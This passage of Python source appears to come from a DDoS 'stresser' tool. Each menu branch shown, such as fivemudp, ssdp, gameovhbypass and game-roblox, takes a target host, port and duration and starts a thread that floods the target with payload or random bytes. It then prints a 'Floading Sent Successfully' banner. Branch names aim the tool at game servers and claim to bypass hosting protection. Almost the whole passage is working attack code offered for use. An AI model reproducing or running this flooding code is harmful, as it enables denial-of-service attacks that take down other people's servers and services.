					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemslump":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivem-guard":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemtcp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemudp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemstresser":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemarkdown":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "2kdown":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[INFO] Floading Sent Successfully")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ssdp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[INFO] Floading Sent Successfully")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "gamebypass":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "gameovhbypass":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "gamekill":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "gameslump":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "gamestresser":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "gamenfokill":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "game-roblox":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "game-fivem":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
